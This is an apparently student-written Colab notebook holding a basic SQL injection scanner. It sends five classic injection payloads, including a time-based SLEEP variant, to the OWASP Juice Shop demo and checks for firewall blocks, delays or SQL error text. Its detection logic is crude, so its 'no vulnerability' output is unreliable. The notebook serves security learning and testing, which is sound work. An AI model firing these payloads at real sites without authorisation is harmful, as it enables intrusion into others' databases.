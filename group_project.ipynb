{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "code",
      "execution_count": 8,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "RUOoRQeAp1Uy",
        "outputId": "5a300f8b-cf2e-4056-e841-816ebec2843c"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "5. No SQL Injection vulnerability detected\n"
          ]
        }
      ],
      "source": [
        "# For making HTTP requests\n",
        "import requests\n",
        "# For measuring response time\n",
        "import time\n",
        "\n",
        "\n",
        "def check_vulnerabilities(url):\n",
        "    \"\"\"\n",
        "    Function to check for SQL Injection vulnerabilities.\n",
        "    It sends different SQL payloads to the target URL and analyzes the response.\n",
        "    \"\"\"\n",
        "    sql_payloads = [\n",
        "         # Basic SQL Injection\n",
        "        \"' OR '1'='1\",\n",
        "         # SQL Injection with comment\n",
        "        \"' OR '1'='1' --\",\n",
        "       # SQL Injection with hash comment\n",
        "        \"' OR '1'='1' #\",\n",
        "        # SQL Injection with multi-line comment\n",
        "        \"' OR '1'='1' /*\",\n",
        "        # Time-based SQL Injection\n",
        "        \"' OR SLEEP(5) --\"\n",
        "\n",
        "    ]\n",
        "    # Simulating a real browser request\n",
        "    headers = {\"User-Agent\": \"Mozilla/5.0\"}\n",
        "\n",
        "    for payload in sql_payloads:\n",
        "        try:\n",
        "          # Start timer to measure response time\n",
        "            start_time = time.time()\n",
        "            response = requests.get(f\"{url}?q={payload}\", headers=headers, timeout=10)\n",
        "            # Calculate response time\n",
        "            response_time = time.time() - start_time\n",
        "\n",
        "            if response.status_code == 403:\n",
        "                print(\"2. Possible Web Application Firewall (WAF) detected!\")\n",
        "                return  # Stop further testing if WAF is detected\n",
        "\n",
        "            if response_time > 4:\n",
        "                print(f\"3. Possible Time-based SQL Injection detected with payload: {payload}\")\n",
        "                return  # Detected significant delay indicating time-based SQLi\n",
        "\n",
        "            if \"syntax error\" in response.text.lower() or \"sql\" in response.text.lower():\n",
        "                print(f\"4. SQL Injection detected with payload: {payload}\")\n",
        "                return  # SQL error in response suggests SQL Injection vulnerability\n",
        "\n",
        "        except requests.exceptions.RequestException:\n",
        "            print(\"1. Connection error or request blocked for payload\")\n",
        "            return  # Handle request failures due to blocking or network issues\n",
        "    # If no payload succeeds/ print output\n",
        "    print(\"5. No SQL Injection vulnerability detected\")\n",
        "\n",
        "if __name__ == \"__main__\":\n",
        "  # Target website to scan\n",
        "    target_url = \"https://juice-shop.herokuapp.com/#/\"\n",
        "    check_vulnerabilities(target_url)\n",
        "\n"
      ]
    }
  ]
}